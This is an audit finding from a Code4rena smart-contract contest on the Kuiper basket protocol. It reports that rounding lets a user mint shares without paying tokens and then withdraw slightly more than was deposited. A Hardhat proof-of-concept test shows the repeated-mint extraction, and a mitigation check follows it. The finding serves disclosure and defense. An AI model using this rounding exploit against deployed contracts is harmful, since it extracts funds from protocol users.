---
# Core Classification
protocol: Kuiper
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 19823
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2021-09-defiProtocol
source_link: https://code4rena.com/reports/2021-09-defiProtocol
github_link: https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/81

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes
  - bridge
  - cdp
  - services
  - yield_aggregator

# Audit Details
report_date: unknown
finders_count: 0
finders:
---

## Vulnerability Title

[M-04] User can mint miniscule amount of shares, later withdraw miniscule more than deposited

### Overview


A bug was found in a defi protocol that allows a user to mint small amounts of shares (like 1) that can result in the user ending up with more tokens than they started with. This is possible because the calculated amount of tokens to pull from the user can be less than 1, and therefore no tokens will be pulled. However, the shares would still be minted. This bug was tested using manual analysis and hardhat. The recommended mitigation step is to add a check to the `pullUnderlying` function to ensure that the token amount is greater than 0. The finding was confirmed by frank-beard (Kuiper) and Alex the Entreprenerd (judge) commented that it was a great find and agreed with the medium severity.

### Original Finding Content

_Submitted by kenzo_

If a user is minting small amount of shares (like 1 - amount depends on baskets weights), the calculated amount of tokens to pull from the user can be less than 1, and therefore no tokens will be pulled. However the shares would still be minted.
If the user does this a few times, he could then withdraw the total minted shares and end up with more tokens than he started with - although a miniscule amount.

#### Impact

User can end up with more tokens than he started with. However, I didn't find a way for the user to get an amount to make this a feasible attack. He gets dust. However he can still get more than he deserves. If for some reason the basket weights grow in a substantial amount, this could give the user more tokens that he didn't pay for.

#### Proof of Concept

Add the following test to `Basket.test.js`.
The user starts with 5e18 UNI, 1e18 COMP, 1e18 AAVE,
and ends with 5e18+4, 1e18+4, 1e18+4.
```js
it("should give to user more than he deserves", async () => {
    await UNI.connect(owner).mint(ethers.BigNumber.from(UNI_WEIGHT).mul(1000000));
    await COMP.connect(owner).mint(ethers.BigNumber.from(COMP_WEIGHT).mul(1000000));
    await AAVE.connect(owner).mint(ethers.BigNumber.from(AAVE_WEIGHT).mul(1000000));

    await UNI.connect(owner).approve(basket.address, ethers.BigNumber.from(UNI_WEIGHT).mul(1000000));
    await COMP.connect(owner).approve(basket.address, ethers.BigNumber.from(COMP_WEIGHT).mul(1000000));
    await AAVE.connect(owner).approve(basket.address, ethers.BigNumber.from(AAVE_WEIGHT).mul(1000000));

    console.log("User balance before minting:");
    console.log("UNI balance: " + (await UNI.balanceOf(owner.address)).toString());
    console.log("COMP balance: " + (await COMP.balanceOf(owner.address)).toString());
    console.log("AAVE balance: " + (await AAVE.balanceOf(owner.address)).toString());

    
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));

    console.log("\nUser balance after minting 1 share 5 times:");
    console.log("UNI balance: " + (await UNI.balanceOf(owner.address)).toString());
    console.log("COMP balance: " + (await COMP.balanceOf(owner.address)).toString());
    console.log("AAVE balance: " + (await AAVE.balanceOf(owner.address)).toString());

    await basket.connect(owner).burn(await basket.balanceOf(owner.address));
    console.log("\nUser balance after burning all shares:");
    console.log("UNI balance: " + (await UNI.balanceOf(owner.address)).toString());
    console.log("COMP balance: " + (await COMP.balanceOf(owner.address)).toString());
    console.log("AAVE balance: " + (await AAVE.balanceOf(owner.address)).toString());
});
```

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

Add a check to `pullUnderlying`:
```solidity
require(tokenAmount > 0);
```

I think it makes sense that if a user is trying to mint an amount so small that no tokens could be pulled from him, the mint request should be denied.
Per my tests, for an initial ibRatio, this number (the minimal amount of shares that can be minted) is 2 for weights in magnitude of 1e18, and if the weights are eg. smaller by 100, this number will be 101.

**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/81)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/81#issuecomment-997206834):**
 > Great find, because this finding shows a clear POC of how to extract value from the system, I agree with medium severity





### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Kuiper |
| Report Date | N/A |
| Finders | N/A |

### Source Links

- **Source**: https://code4rena.com/reports/2021-09-defiProtocol
- **GitHub**: https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/81
- **Contest**: https://code4rena.com/reports/2021-09-defiProtocol

### Keywords for Search

`vulnerability`

